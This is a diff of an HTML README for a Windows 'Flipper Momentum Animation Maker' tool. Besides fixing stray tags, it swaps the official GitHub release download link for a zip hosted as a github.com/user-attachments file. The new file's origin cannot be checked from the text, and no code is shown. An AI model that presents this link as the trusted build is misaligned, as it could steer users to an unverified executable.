@@ -2,18 +2,19 @@
   <img src="./Images/husky.png" alt="Huskygut Flipper" style="max-width:100%; height:auto;">
 </p>
   
-<p><h2 align="center">
-  <a href="https://github.com/huskygut/flipper-momentum-animation-maker/releases/download/v0.0.2/Flipper-Momentum-%20Animation-Maker.zip">
+<p>
+  <h2 align="center">
+  <a href="https://github.com/user-attachments/files/26393414/Flipper-Momentum-.Animation-Maker.zip">
     Download the Windows Build
   </a>
 </h2>
 </p>
-/p>
+<p
 <h1 align="center">Flipper Momentum Animation Maker</h1>
 
 <p align="center" style="font-size: 1.15rem;">
   Version 002
-</p>>
+</p>
 
 <p align="center">
   <img src="Images/FMAMPIC2.png" alt="FMAM screenshot 2" width="700" />
